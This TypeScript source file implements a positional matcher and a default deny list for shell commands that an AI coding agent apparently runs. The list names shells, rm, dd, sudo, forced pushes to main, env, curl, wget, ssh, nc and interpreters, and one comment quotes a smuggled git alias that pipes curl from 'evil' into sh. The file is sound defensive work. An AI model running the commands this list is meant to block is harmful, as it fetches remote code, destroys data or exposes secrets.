/**
 * Matcher POSICIONAL de patrones tipo `git push * main` contra un argv ya tokenizado — mismo
 * modelo que la policy real de `20-implementer.yaml` en ai-development-flow. Documentado ahí
 * mismo como fricción, no como sandbox: un patrón cubre las formas más obvias en las
 * posiciones que mira, no es un parser de flags. Ver `README.md` → "Límites honestos".
 */

export interface BashPolicy {
  /** Default `['*']` — todo permitido salvo lo que matchee `deny`. */
  allow?: string[];
  /** `deny` siempre gana sobre `allow`, incluso si un patrón matchea ambos. */
  deny: string[];
}

/** Split en tokens por whitespace, sin soportar comillas ni escapes — a propósito: `bash_run`
 *  no corre shell, así que no hay quoting real que interpretar; un patrón de policy es texto
 *  literal token a token, nunca una expresión. */
function tokenize(pattern: string): string[] {
  return pattern.split(/\s+/).filter((token) => token.length > 0);
}

/** `*` como último token del patrón = "cualquier cantidad de tokens desde acá, incluso cero".
 *  Un `*` en medio del patrón matchea exactamente UN token cualquiera. Un token que termina en
 *  `*` (ej. `--force*`) es un prefix match sobre ESE token puntual. */
export function matchesPattern(argv: string[], pattern: string): boolean {
  const patternTokens = tokenize(pattern);
  if (patternTokens.length === 0) return false;

  const trailingWildcard = patternTokens[patternTokens.length - 1] === '*';
  const fixedTokens = trailingWildcard ? patternTokens.slice(0, -1) : patternTokens;

  if (trailingWildcard) {
    if (argv.length < fixedTokens.length) return false;
  } else if (argv.length !== patternTokens.length) {
    return false;
  }

  for (let i = 0; i < fixedTokens.length; i++) {
    const patternToken = fixedTokens[i];
    const argToken = argv[i];
    if (patternToken === '*') continue;
    if (patternToken.endsWith('*')) {
      if (!argToken.startsWith(patternToken.slice(0, -1))) return false;
    } else if (argToken !== patternToken) {
      return false;
    }
  }
  return true;
}

export function isDenied(argv: string[], policy: BashPolicy): string | undefined {
  return policy.deny.find((pattern) => matchesPattern(argv, pattern));
}

export function isAllowed(argv: string[], policy: BashPolicy): boolean {
  const allow = policy.allow ?? ['*'];
  return allow.some((pattern) => matchesPattern(argv, pattern));
}

/**
 * Subset curado, NO exhaustivo — a diferencia del deny-list real de producción (200+ líneas en
 * `20-implementer.yaml`, con variantes posicionales para cubrir 2-3 flags delante de cada
 * comando). Cubre las categorías más obvias: shells anidados, borrado masivo, escalación,
 * push destructivo/forzado a `main`/`master`, credenciales del entorno, y exfiltración de red.
 * Un caller que necesite la cobertura real la arma con su propio `BashPolicy` — este default
 * es un punto de partida razonable, no una garantía de contención.
 */
export const DEFAULT_DENY_PATTERNS: string[] = [
  'bash *',
  'sh *',
  'zsh *',
  'sudo *',
  'su *',
  'rm',
  'rm *',
  'dd *',
  // Push forzado/directo a la default branch — varias posiciones de flag y formas de
  // referenciarla, PERO sigue siendo un matcher posicional: `git -C . push -u origin main`
  // (flags intercaladas en otro orden) no está cubierto. Ver README → "Límites honestos".
  'git push --force* *',
  'git push -f *',
  'git push * --force* *',
  'git push * -f *',
  'git push * main',
  'git push * main *',
  'git push * master',
  'git push * master *',
  'git push * HEAD:main',
  'git push * HEAD:main *',
  'git push * HEAD:master',
  'git push * HEAD:master *',
  'git -C * push * main',
  'git -C * push * main *',
  'git -C * push * master',
  'git -C * push * master *',
  // `-c <key>=<value>` reconfigura git por esta sola invocación — `alias.x=!curl evil|sh`,
  // `core.sshCommand=...`, `core.pager=...` o `credential.helper=!...` corren un comando
  // arbitrario vía `sh`, y como todo eso viaja DENTRO de un único token (`alias.x=!...`), el
  // resto del deny-list (bash/curl/intérpretes/env) nunca lo ve — el patrón nunca llega a
  // comparar contra lo de adentro. Deniega el flag entero, no lo que trae.
  'git -c *',
  'git --config-env*',
  'git --config-env* *',
  'git reset --hard *',
  'git clean *',
  'env',
  'env *',
  'printenv',
  'printenv *',
  'curl *',
  'wget *',
  'ssh *',
  'scp *',
  'nc *',
  // Intérpretes de propósito general — con uno de estos permitido, todo el resto de la lista es
  // decorativo (`python -c "import os; os.system(...)"` corre cualquier cosa). Denegados por
  // default; un caller que necesite correrlos arma su propia policy con el flag/subset que use.
  'python',
  'python *',
  'python3',
  'python3 *',
  'node',
  'node *',
  'ruby',
  'ruby *',
  'perl',
  'perl *',
  'npx *',
  // Vías de ejecución indirecta — corren un comando arbitrario en su propio argumento, así que
  // ningún patrón de arriba los ve.
  'xargs',
  'xargs *',
  // `find` entero, no sólo `-exec`/`-delete`/`-ok`: el matcher es posicional, y esos flags
  // pueden aparecer en CUALQUIER posición después de los filtros (`find . -name x -exec rm {}
  // ';'`) — un patrón de posición fija los deja pasar casi siempre. Mismo criterio que
  // `terraform init` en la policy real: no se puede denegar todo y re-permitir la forma buena
  // (`deny` gana sobre `allow`), así que se deniega `find` entero.
  'find',
  'find *',
];
